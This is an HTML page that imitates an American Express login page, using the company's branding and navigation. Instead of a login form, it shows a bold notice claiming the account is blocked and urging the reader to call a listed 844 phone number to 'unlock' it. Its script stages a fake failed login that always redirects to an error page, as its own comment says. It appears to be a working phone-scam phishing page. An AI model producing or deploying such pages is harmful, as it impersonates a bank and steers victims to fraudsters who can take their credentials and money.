<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Amex Login</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #f3f3f3;
    }

    .navbar {
      background-color: white;
      display: flex;
      align-items: center;
      padding: 10px 30px;
      border-bottom: 1px solid #ddd;
      justify-content: space-between;
    }

    .logo img {
      height: 40px;
    }

    .navbar nav a {
      margin: 0 10px;
      text-decoration: none;
      color: #0077c5;
      font-weight: 500;
    }

    .right-nav {
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .login-button {
      background-color: #0077c5;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
    }

    .container {
      display: flex;
      justify-content: center;
      padding: 40px;
      gap: 40px;
    }

    .login-box {
      background-color: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 350px;
    }

    .login-box h2 {
      margin-bottom: 20px;
      font-weight: normal;
    }

    .login-box label {
      display: block;
      margin: 15px 0 5px;
      font-weight: bold;
    }

    .login-box input[type="text"],
    .login-box input[type="password"],
    .login-box select {
      width: 100%;
      padding: 10px;
      border: 1px solid #bbb;
      border-radius: 4px;
      background-color: #f7f9fa;
    }

    .error {
      border-color: red !important;
      background-color: #ffe6e6 !important;
    }

    .password-container {
      position: relative;
    }

    .show-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      color: #0077c5;
      cursor: pointer;
      font-size: 14px;
    }

    .remember {
      margin-top: 15px;
    }

    .login-submit {
      margin-top: 20px;
      width: 100%;
      background-color: #0077c5;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    .promo-box img {
      width: 350px;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <header class="navbar">
    <div class="logo">
      <img src="logo.png" alt="Amex Logo">
    </div>
    <nav>
      <a href="#">My Account</a>
      <a href="#">Cards</a>
      <a href="#">Banking</a>
      <a href="#">Travel</a>
      <a href="#">Rewards & Benefits</a>
      <a href="#">Business</a>
    </nav>
    <div class="right-nav">
      <span class="search-icon">üîç</span>
      <a href="#">Customer Service</a>
      <button class="login-button">Log In</button>
    </div>
  </header>

  <main class="container">
    <div class="login-box">
      <form onsubmit="return validateForm(event)">
        



<p>
  <strong>
    "Your American Express account access has been blocked due to suspicious login attempts. 
    Contact our customer service team at 
    <a href="tel:+18443925473" style="color: blue; text-decoration: none;">
      +1 (844) 392-5473
    </a> to verify and unlock your account."
  </strong>
</p>


        

        

  <script>
    function togglePassword() {
      const password = document.getElementById("password");
      password.type = password.type === "password" ? "text" : "password";
    }

    function validateForm(event) {
      event.preventDefault();
      const userId = document.getElementById("userId");
      const password = document.getElementById("password");
      let valid = true;

      // Reset previous error styles
      userId.classList.remove("error");
      password.classList.remove("error");

      // Basic dummy validation
      if (userId.value.trim() === "") {
        userId.classList.add("error");
        valid = false;
      }

      if (password.value.trim() === "") {
        password.classList.add("error");
        valid = false;
      }

      if (!valid) {
        return false; // Prevent redirect
      }

      // Fake failed login attempt: always redirect to error.html
      window.location.href = "error.html";
    }
  </script>
</body>
</html>
